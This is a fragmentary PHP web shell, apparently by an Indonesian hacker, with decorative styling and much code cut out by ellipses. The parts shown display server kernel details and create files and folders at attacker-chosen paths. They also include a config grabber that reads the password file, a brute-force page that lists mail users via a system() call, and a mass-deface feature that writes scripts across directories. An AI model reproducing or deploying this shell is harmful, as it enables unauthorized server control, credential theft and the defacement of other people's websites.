...
<link rel="shortcut icon" href="http://www.gambaranimasi.org/data/media/781/animasi-bergerak-bendera-indonesia-0013.gif" type="image/x-icon">
...
/*MASIH STYLE UPIL BRO*/

echo '<script>(function(e,t,n){var r=e.querySelectorAll("html")[0];r.className=r.className.replace(/(^|\s)no-js(\s|$)/,"$1js$2")})(document,window,0);</script>';
...
echo "<center><font color='white' siz='10px' face='Fredericka the Great'>[+] Mr.B4h4' [+]</font></center><br/>";

/** info kernel */
echo"
<font size='4' color='White' face='Jolly Lodger'>
<center>".php_uname()."<br>
...
echo '<br/><font size="4" style="font-family:Jolly Lodger; color:red;">
...
<?php 
	...
	## Update Penambahan Fitur Create New File And Folder (Bagian Interface)
	echo"<center>
    		<table>
	    		<tr>
	          		<td>
	          		  <form style='float:right;' method='POST'><input name='path' value=".$putraganteng." type=hidden>
					  <input class=bordergaya type='submit' value='Create New File' >
					  <input class=bordergaya size='40' name='new_file' /></form>
			        </td>
	          		<td>
	          		  <form  style='float:left;' method='POST'><input name='path' value=".$putraganteng." type=hidden>
    ...
    ## Update Penambahan Fitur Create New File And Folder (Bagian Function)
	function mk_file_ui(){
	    chdir($_POST['path']);
	...
	function create_dir(){
		...
		if(is_writable($_POST['path'])){
		    mkdir($new_dir);
		    echo '<script>alert("Creating Folder Success!!");</script>';    
		}else{
		    echo '<script>alert("Creating Folder Failed!!");</script>';   
		}
	}
...
<?php
		...
		*/
		...
		## Update Penambahan Fitur Create New File And Folder (Bagian If dan Else)
		else if(isset($_POST['path']) && isset($_POST['new_file'])){
		    chdir($_POST['path']);
		    mk_file_ui();
		}else if(isset($_POST['path']) && isset($_POST['new_f_name']) && isset($_POST['n_file_content'])){
    		mk_file_bg();
		}else if(isset($_POST['path']) && isset($_POST['new_dir'])){
		    chdir($_POST['path']);
		    create_dir();
		}
		## End Of Update
...
$passwd=explode("\n",$passwd);
echo "<br><br><center><font face='Homenaje' color=Crimson size=2pt>santai wae...Lagi Di Proses...</center><br>";
...
echo '<b><font face="Homenaje" color="springgreen" size="3pt"><b>Selesai Bos Q, Monggo >></b> <a target="_blank" href="I-Conf">sikat Config</a></font></b>';}
die();
}
/////// Cukup Sampai Disini ya Grabber :( ////////
		...
		elseif(isset($_GET['x']) && ($_GET['x'] == 'brute'))
			...
			<input name="page" type="hidden" value="find">
				...
				<td>
				<strong><textareacols="50" style="background:#191818;outline:none;color:white;" rows="5" name="usernames"><?php system('ls /var/mail');?></textarea></strong>
			    </td>
			    <tr>
			    <td>
				<strong>Pass :</strong>
...
function sabun_massal($path,$namafile,$isi_script) {
	...
	<td colspan='3' align='center'><input class='justborder' type='submit' name='start' value='Mass Deface' style='width: 50%;'><br/></td>
		...
		elseif(isset($_GET['x']) && ($_GET['x'] == 'tentang'))
		{
				echo"<br><br>
					<center><b>
			<font face='Jolly Lodger' color='red' size='6px'>Indonesian <font color='white'> Hacker</font><br>
					<br>
...
/////////////////////////////////////////////////////////////////////////
	...
	echo "<center>";
			...
			echo "<tr>
			<td><a style='color:white; font-family:Homenaje;' href=\"?path=$path/$dir\">$dir</a></td><td><center style='color:orange; font-family:Homenaje;'>--</center></td>
			<td><center>";
...
<script language="JavaScript"> 
	Year=new Date(); 
	var copyright=Year.getUTCFullYear(); document.write("<tabel style='padding:3px 6px; border:2px solid #2d2b2b; border-radius:5px;'><tr><td><font face='Fredericka the Great' size='3px' color='gray'> "+ copyright +" </font></td></tr></table>"); </script>
</div>
</BODY></html>
